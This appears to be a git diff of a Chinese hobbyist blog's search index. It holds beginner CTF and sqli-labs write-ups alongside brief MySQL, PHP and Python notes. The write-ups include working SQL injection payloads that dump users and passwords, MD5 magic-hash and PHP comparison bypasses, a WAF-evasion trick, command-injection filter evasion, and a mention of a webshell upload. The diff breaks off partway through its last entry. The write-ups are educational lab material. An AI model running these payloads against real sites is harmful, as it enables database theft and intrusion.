@@ -1,112 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Mysql函数用法</title>
-    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<ol>
-<li>count()：汇总数据函数</li>
-<li>rand()：随机输出一个小于1的正数</li>
-<li>floor()：把输出的结果取整</li>
-<li>group by语句：把结果分组输出</li>
-<li>concat()：连接两条语句</li>
-</ol>
-]]></content>
-      <categories>
-        <category>数据库学习</category>
-      </categories>
-      <tags>
-        <tag>Mysql</tag>
-        <tag>函数用法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hitcon lab1</title>
-    <url>/2019/04/17/Hitcon-lab1/</url>
-    <content><![CDATA[<p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
-<pre><code>Hitcon这个是le3ding大佬推给我的
-
-
-这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git
-
-
-——————————分割线——————————
-
-lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法
-
-用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
-<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
-<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag
-
-将if(password == magic)改为if(password ！= magic)
-
-运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
-]]></content>
-      <categories>
-        <category>逆向学习</category>
-      </categories>
-      <tags>
-        <tag>Hitcon</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bugku 备份文件 wirteup</title>
-    <url>/2018/11/26/bugku%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6wirteup/</url>
-    <content><![CDATA[<p>备份文件一般情况是在后缀名后加的<em>.swp，</em>.bak</p>
-<p>利用==比较漏洞</p>
-<p>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</p>
-<a id="more"></a>
-<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
-<p>下列的字符串的MD5值都是0e开头的：</p>
-<p>QNKCDZO</p>
-<p>240610708</p>
-<p>s878926199a</p>
-<p>s155964671a</p>
-<p>s214587387a</p>
-<p>s214587387a</p>
-]]></content>
-      <categories>
-        <category>CTF学习</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>ctf学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bugku 构造函数 wirteup</title>
-    <url>/2018/11/28/bugku%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0wirteup/</url>
-    <content><![CDATA[<?php
-highlight_file('flag.php');
-$_GET['id'] = urldecode($_GET['id']);
-$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
-if (isset($_GET['uname']) and isset($_POST['passwd'])) {
-    if ($_GET['uname'] == $_POST['passwd'])
-
-        print 'passwd can not be uname.';
-
-    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))
-
-        die('Flag: '.$flag);
-
-    else
-
-        print 'sorry!';
-
-}
-?>
-
-<p> if (sha1($_GET[‘uname’]) === sha1($_POST[‘passwd’])</p>
-<p>构造数组  ?id=margin&amp;uname[ ]=1</p>
-]]></content>
-      <categories>
-        <category>CTF学习</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>ctf学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hitcon_lab4</title>
     <url>/2019/04/24/Hitcon-lab4/</url>
     <content><![CDATA[<p>lab4是一道 return to libc 的题，</p>
@@ -180,6 +74,90 @@ io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3c
       </tags>
   </entry>
   <entry>
+    <title>Mysql函数用法</title>
+    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<ol>
+<li>count()：汇总数据函数</li>
+<li>rand()：随机输出一个小于1的正数</li>
+<li>floor()：把输出的结果取整</li>
+<li>group by语句：把结果分组输出</li>
+<li>concat()：连接两条语句</li>
+</ol>
+]]></content>
+      <categories>
+        <category>数据库学习</category>
+      </categories>
+      <tags>
+        <tag>Mysql</tag>
+        <tag>函数用法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku 备份文件 wirteup</title>
+    <url>/2018/11/26/bugku%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6wirteup/</url>
+    <content><![CDATA[<p>备份文件一般情况是在后缀名后加的<em>.swp，</em>.bak</p>
+<p>利用==比较漏洞</p>
+<p>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</p>
+<a id="more"></a>
+<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
+<p>下列的字符串的MD5值都是0e开头的：</p>
+<p>QNKCDZO</p>
+<p>240610708</p>
+<p>s878926199a</p>
+<p>s155964671a</p>
+<p>s214587387a</p>
+<p>s214587387a</p>
+]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>ctf学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hitcon lab1</title>
+    <url>/2019/04/17/Hitcon-lab1/</url>
+    <content><![CDATA[<p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
+<pre><code>Hitcon这个是le3ding大佬推给我的
+
+
+这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git
+
+
+——————————分割线——————————
+
+lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法
+
+用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
+<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
+<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag
+
+将if(password == magic)改为if(password ！= magic)
+
+运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
+]]></content>
+      <categories>
+        <category>逆向学习</category>
+      </categories>
+      <tags>
+        <tag>Hitcon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buuctf web easy calc wirteup</title>
+    <url>/2020/04/02/buuctf-web-easy-calc-wirteup/</url>
+    <content><![CDATA[<p>此题考查php文件解析漏洞</p>
+<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
+<a id="more"></a>
+<p>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
+<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
+<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
+<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
+]]></content>
+  </entry>
+  <entry>
     <title>bugku 文件上传 wirteup</title>
     <url>/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/</url>
     <content><![CDATA[<p><img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
@@ -197,44 +175,30 @@ io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3c
       </tags>
   </entry>
   <entry>
-    <title>calc2</title>
-    <url>/2019/04/19/calc2/</url>
-    <content><![CDATA[<p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
-<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
-<a id="more"></a>
+    <title>bugku 构造函数 wirteup</title>
+    <url>/2018/11/28/bugku%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0wirteup/</url>
+    <content><![CDATA[<?php
+highlight_file('flag.php');
+$_GET['id'] = urldecode($_GET['id']);
+$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
+if (isset($_GET['uname']) and isset($_POST['passwd'])) {
+    if ($_GET['uname'] == $_POST['passwd'])
 
-<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
-<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
-<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面
+        print 'passwd can not be uname.';
 
-接着打算直接cat flag，然而并不行
+    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))
 
-if(!empty($_GET)){
-$str=$_GET[&quot;calc&quot;];
-if(strpos($str,&quot;#&quot;)!==false)
-    die;
-if(strpos($str,&quot;`&quot;)!==false)
-    die;
-if(strpos($str,&quot;flag&quot;)!==false)
-    die;
+        die('Flag: '.$flag);
 
-成了,flag被过滤了
+    else
 
-嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
-<pre><code>拿到flag</code></pre>]]></content>
-      <categories>
-        <category>CTF学习</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>i春秋 file_get_contents wirteup</title>
-    <url>/2018/12/05/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/</url>
-    <content><![CDATA[<p>file_get_contents 用于 将整个文件读入一个字符串</p>
-<p>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。</p>
-<p>用法<br>$homepage = file_get_contents(‘filename’);</p>
+        print 'sorry!';
+
+}
+?>
+
+<p> if (sha1($_GET[‘uname’]) === sha1($_POST[‘passwd’])</p>
+<p>构造数组  ?id=margin&amp;uname[ ]=1</p>
 ]]></content>
       <categories>
         <category>CTF学习</category>
@@ -243,33 +207,6 @@ if(strpos($str,&quot;flag&quot;)!==false)
         <tag>Web</tag>
         <tag>ctf学习</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>i春秋 sql绕过 wirteup</title>
-    <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/</url>
-    <content><![CDATA[<p>首先 要对id注入。首先试一下order by，发现错误，可能是关键字过滤。</p>
-<p>试了试/**/还是不行，改用&lt;&gt;发现可以了</p>
-<p>payload如下<br>、<br>?id=1 ord&lt;&gt;er by 3 –<br>?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 –<br>剩下的正常注入</p>
-]]></content>
-      <categories>
-        <category>CTF学习</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>ctf学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuctf web easy calc wirteup</title>
-    <url>/2020/04/02/buuctf-web-easy-calc-wirteup/</url>
-    <content><![CDATA[<p>此题考查php文件解析漏洞</p>
-<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
-<a id="more"></a>
-<p>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
-<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
-<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
-<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
-]]></content>
   </entry>
   <entry>
     <title>hitcon  lab3 </title>
@@ -315,36 +252,6 @@ io.interactive()
       </tags>
   </entry>
   <entry>
-    <title>php函数学习</title>
-    <url>/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>var_dump()<br>用于输出变量的相关信息。 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
-<p>file_get_contents（）<br>把整个文件读入一个字符串中<br>函数是用于把文件的内容读入到一个字符串中的首选方法.file()函数同样可以</p>
-<p>scandir（）<br>返回指定目录中的文件和目录的数组。</p>
-]]></content>
-      <categories>
-        <category>编程</category>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python库</title>
-    <url>/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>import  random<br>随机整数：print random.randint(1,50)<br>随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)<br>随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</p>
-<a id="more"></a>
-<p>随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)<br>多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)<br>从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str<br>多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))<br>随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])<br>打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</p>
-]]></content>
-      <categories>
-        <category>编程</category>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>i春秋 sqli wirteup</title>
     <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sqli-wirteup/</url>
     <content><![CDATA[<p>sql注入时，逗号被过滤后可用payload</p>
@@ -380,6 +287,199 @@ io.interactive()
       <tags>
         <tag>Web</tag>
         <tag>ctf学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>i春秋 file_get_contents wirteup</title>
+    <url>/2018/12/05/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/</url>
+    <content><![CDATA[<p>file_get_contents 用于 将整个文件读入一个字符串</p>
+<p>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。</p>
+<p>用法<br>$homepage = file_get_contents(‘filename’);</p>
+]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>ctf学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>calc2</title>
+    <url>/2019/04/19/calc2/</url>
+    <content><![CDATA[<p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
+<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
+<a id="more"></a>
+
+<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
+<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
+<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面
+
+接着打算直接cat flag，然而并不行
+
+if(!empty($_GET)){
+$str=$_GET[&quot;calc&quot;];
+if(strpos($str,&quot;#&quot;)!==false)
+    die;
+if(strpos($str,&quot;`&quot;)!==false)
+    die;
+if(strpos($str,&quot;flag&quot;)!==false)
+    die;
+
+成了,flag被过滤了
+
+嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
+<pre><code>拿到flag</code></pre>]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python库</title>
+    <url>/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>import  random<br>随机整数：print random.randint(1,50)<br>随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)<br>随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</p>
+<a id="more"></a>
+<p>随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)<br>多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)<br>从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str<br>多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))<br>随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])<br>打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</p>
+]]></content>
+      <categories>
+        <category>编程</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php函数学习</title>
+    <url>/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>var_dump()<br>用于输出变量的相关信息。 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
+<p>file_get_contents（）<br>把整个文件读入一个字符串中<br>函数是用于把文件的内容读入到一个字符串中的首选方法.file()函数同样可以</p>
+<p>scandir（）<br>返回指定目录中的文件和目录的数组。</p>
+]]></content>
+      <categories>
+        <category>编程</category>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>i春秋 sql绕过 wirteup</title>
+    <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/</url>
+    <content><![CDATA[<p>首先 要对id注入。首先试一下order by，发现错误，可能是关键字过滤。</p>
+<p>试了试/**/还是不行，改用&lt;&gt;发现可以了</p>
+<p>payload如下<br>、<br>?id=1 ord&lt;&gt;er by 3 –<br>?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 –<br>剩下的正常注入</p>
+]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>ctf学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab Less(18-19)</title>
+    <url>/2020/07/28/sqli-lab-Less-18-19/</url>
+    <content><![CDATA[<p>Less -18<br>    这一关考察 Header Injection</p>
+<pre><code>直接bp抓包分析</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/1.png" alt></p>
+<a id="more"></a>
+
+<pre><code>可以看到将user-agent改为aaa,右侧的回显也是aaa</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/2.png" alt></p>
+<pre><code>加个单引号，可以看到发生了语法错误，证明这里存在注入点。
+
+接下来就是正常注入，这里不知道为什么，如果你用注释符这里会报错如：</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/3.png" alt></p>
+<pre><code>所以我只能用 &apos;1&apos; = &apos;1  进行闭合
+
+-查表
+aaa&apos; and updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x3a),1) and &apos;1&apos; = &apos;1
+
+这里输出的数据被限制了，采用limit绕过
+
+aaa&apos; and updatexml(1,concat(0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1
+
+-查列
+aaa&apos; and updatexml(1,concat(0x3a,(select column_name from information_schema.tables where table_name = &apos;users&apos; limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1
+
+-查数据
+aaa&apos; and updatexml(1,concat(0x3a,(select  username from users limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1</code></pre><p>————分割线————–</p>
+<p>Less -19</p>
+<pre><code>19关与18相同，只是注入位置变为Referer其他条件不变</code></pre>]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>sqli-lab</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab Less20</title>
+    <url>/2020/07/28/sqli-lab-Less20/</url>
+    <content><![CDATA[<p>Less -20</p>
+<pre><code>首先进行正常登陆</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/1.png" alt></p>
+<a id="more"></a>    
+
+<pre><code>通过bp抓包分析</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/2.png" alt><br><img src="/2020/07/28/sqli-lab-Less20/3.png" alt></p>
+<pre><code>可以看到cookie被明文存放，刷新页面后发现cookie仍存在</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/4.png" alt></p>
+<pre><code>在cookie处测试</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/5.png" alt></p>
+<pre><code>发现产生报错信息，从而判断此处为注入点。
+此处的后台流程为：
+1、登陆后将uname写入Cookie。
+2、在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。
+3、在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；若不存在…
+由此我们可以使用union联合查询进行注入
+
+-判断字段数
+admin&apos; order by 4#
+
+-判断回显字段
+-admin&apos; union select 1,2,3#
+
+-查表
+-admin&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()#
+
+-查列
+-admin&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&apos;users&apos; #
+
+-查数据
+-admin&apos; union select 1,group_concat(username),3 from users #</code></pre>]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>sqli-lab</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab less-17</title>
+    <url>/2020/07/27/sqli-lab-less-17/</url>
+    <content><![CDATA[<p>17关相比于之前关卡有很大不同，这一关注入点在密码上<br>一开始并没有任何思绪，于是只能观察源码</p>
+<a id="more"></a>    
+<p><img src="/2020/07/27/sqli-lab-less-17/image1.png" alt><br>从源码中可以看到：接收到用户POST的uname和passwd后，首先根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
+<p>这一关使用报错注入<br>一般常用的报错注入有updatexml()、 extractvaule()和floor(),在这里floor()函数用不了<br>剩下两个都可以用，首先介绍下两个函数的用法<br>1、updatexml()<br> UpdateXML(xml_target, xpath_expr, new_xml)<br>这是updatexml()的基本用法，可以看出需要三个参数<br>第一个参数是目标是针对于xml文档<br>第二参数是xpath的表达<br> 第三个参数是将xpath表达式转换成什么，也就是替换查找到的符合条件的数据<br>2、 extractvaule()<br>extractvalue(目标xml文档，xml路径)<br>这里第二个参数的位置就是可以操作的地方<br>这里用采用第2种方法<br>–查表<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查列<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查用户名<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>在查找用户名的时候出现了问题</p>
+<p><img src="/2020/07/27/sqli-lab-less-17/image.png" alt>    </p>
+<p>报错了，通过查询换代码发现，后台限制了对users表的查询，不可以查询此表，因此我们可以将其换一个名字</p>
+<p>–绕过<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查密码<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from (select password from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>这里有一个问题， UpdateXML(xml_target, xpath_expr, new_xml)这个函数，第一、三参数是string类型</p>
+<p>我测试时采用了这个payload ：aa’ and updataxml(0x7e,(concat(1,(select table_name from information_schema.tables where table_schema=database() limit 1,1),1),1)#<br>于是我的数据库中的密码的值全部变成了1。。。</p>
+<p>在实际环境中，这样的测试肯定是不行的，所以尽可能不将参数设为int型</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>sqli-lab</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -436,106 +536,6 @@ eg: 还有system(&apos;ls&apos;)的读取方法但是这里应该没有权限.</
       <tags>
         <tag>Web</tag>
         <tag>注入技巧</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab less-17</title>
-    <url>/2020/07/27/sqli-lab-less-17/</url>
-    <content><![CDATA[<p>17关相比于之前关卡有很大不同，这一关注入点在密码上<br>一开始并没有任何思绪，于是只能观察源码</p>
-<a id="more"></a>    
-<p><img src="/2020/07/27/sqli-lab-less-17/image1.png" alt><br>从源码中可以看到：接收到用户POST的uname和passwd后，首先根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
-<p>这一关使用报错注入<br>一般常用的报错注入有updatexml()、 extractvaule()和floor(),在这里floor()函数用不了<br>剩下两个都可以用，首先介绍下两个函数的用法<br>1、updatexml()<br> UpdateXML(xml_target, xpath_expr, new_xml)<br>这是updatexml()的基本用法，可以看出需要三个参数<br>第一个参数是目标是针对于xml文档<br>第二参数是xpath的表达<br> 第三个参数是将xpath表达式转换成什么，也就是替换查找到的符合条件的数据<br>2、 extractvaule()<br>extractvalue(目标xml文档，xml路径)<br>这里第二个参数的位置就是可以操作的地方<br>这里用采用第2种方法<br>–查表<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
-<p>–查列<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
-<p>–查用户名<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
-<p>在查找用户名的时候出现了问题</p>
-<p><img src="/2020/07/27/sqli-lab-less-17/image.png" alt>    </p>
-<p>报错了，通过查询换代码发现，后台限制了对users表的查询，不可以查询此表，因此我们可以将其换一个名字</p>
-<p>–绕过<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
-<p>–查密码<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from (select password from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
-<p>这里有一个问题， UpdateXML(xml_target, xpath_expr, new_xml)这个函数，第一、三参数是string类型</p>
-<p>我测试时采用了这个payload ：aa’ and updataxml(0x7e,(concat(1,(select table_name from information_schema.tables where table_schema=database() limit 1,1),1),1)#<br>于是我的数据库中的密码的值全部变成了1。。。</p>
-<p>在实际环境中，这样的测试肯定是不行的，所以尽可能不将参数设为int型</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>sqli-lab</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab Less20</title>
-    <url>/2020/07/28/sqli-lab-Less20/</url>
-    <content><![CDATA[<p>Less -20</p>
-<pre><code>首先进行正常登陆</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/1.png" alt></p>
-<a id="more"></a>    
-
-<pre><code>通过bp抓包分析</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/2.png" alt><br><img src="/2020/07/28/sqli-lab-Less20/3.png" alt></p>
-<pre><code>可以看到cookie被明文存放，刷新页面后发现cookie仍存在</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/4.png" alt></p>
-<pre><code>在cookie处测试</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/5.png" alt></p>
-<pre><code>发现产生报错信息，从而判断此处为注入点。
-此处的后台流程为：
-1、登陆后将uname写入Cookie。
-2、在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。
